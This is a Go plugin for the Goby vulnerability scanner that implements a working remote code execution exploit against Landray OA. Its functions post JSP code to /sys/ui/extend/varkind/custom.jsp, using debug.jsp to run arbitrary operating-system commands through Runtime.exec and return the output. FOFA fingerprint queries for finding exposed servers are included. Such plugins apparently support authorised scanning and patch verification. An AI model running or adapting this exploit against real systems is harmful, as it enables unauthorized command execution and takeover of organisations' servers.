package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Landray OA debug.jsp RCE",
    "Description": "<p>Landray OA is a new generation of digital office platform, which comprehensively assists enterprises in online office, business collaboration and digital transformation.</p><p>Landray OA debug.jsp has security vulnerabilities, attackers can execute arbitrary script code to obtain server permissions.</p>",
    "Product": "Landray-OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2022-08-30",
    "Author": "abszse",
    "FofaQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "GobyQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "Level": "2",
    "Impact": "<p>Landray OA debug.jsp has security vulnerabilities, attackers can execute arbitrary script code to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released a patch, please pay attention to the official website update in time: <a href=\"https://www.landray.com.cn/\">https://www.landray.com.cn/</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/0xu7K726hp1xfnShhjGbVQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information technology application innovation industry",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "蓝凌 OA debug.jsp 代码执行漏洞",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌OA是新一代数字化办公平台，全面助力企业在线办公、业务协同和数字化转型。<br></p><p>蓝凌OA debug.jsp 存在安全漏洞，攻击者可执行任意脚本代码获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布补丁，请及时关注官网更新：<a href=\"https://www.landray.com.cn/\">https://www.landray.com.cn/</a><br></p>",
            "Impact": "<p>蓝凌OA debug.jsp 存在安全漏洞，攻击者可执行任意脚本代码获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "信创",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Landray OA debug.jsp RCE",
            "Product": "Landray-OA",
            "Description": "<p>Landray OA is a new generation of digital office platform, which comprehensively assists enterprises in online office, business collaboration and digital transformation.<br></p><p>Landray OA debug.jsp has security vulnerabilities, attackers can execute arbitrary script code to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released a patch, please pay attention to the official website update in time: <a href=\"https://www.landray.com.cn/\">https://www.landray.com.cn/</a><br></p>",
            "Impact": "<p>Landray OA debug.jsp has security vulnerabilities, attackers can execute arbitrary script code to obtain server permissions.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/sys/ui/extend/varkind/custom.jsp"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=out.println(new%20String(new%20sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=out.println("Hello world");`

			if _, err := httpclient.DoHttpRequest(u, cfg1); err == nil {

				uri2 := "/sys/ui/extend/varkind/custom.jsp"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg2.Data = `var={"body":{"file":"/sys/common/code.jsp"}}`
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43\n")
				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/sys/ui/extend/varkind/custom.jsp"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = fmt.Sprintf(`var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=java.io.InputStream in = Runtime.getRuntime().exec("%s").getInputStream(); int a = -1; byte[] b = new byte[2048];  while((a=in.read(b))!=-1){ out.println(new String(b)); };`,cmd)
				
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {

				uri2 := "/sys/ui/extend/varkind/custom.jsp"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg2.Data = `var={"body":{"file":"/sys/common/code.jsp"}}`
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					expResult.Output = resp2.Utf8Html
					expResult.Success = true
				}

			}

			return expResult
		},
	))
}
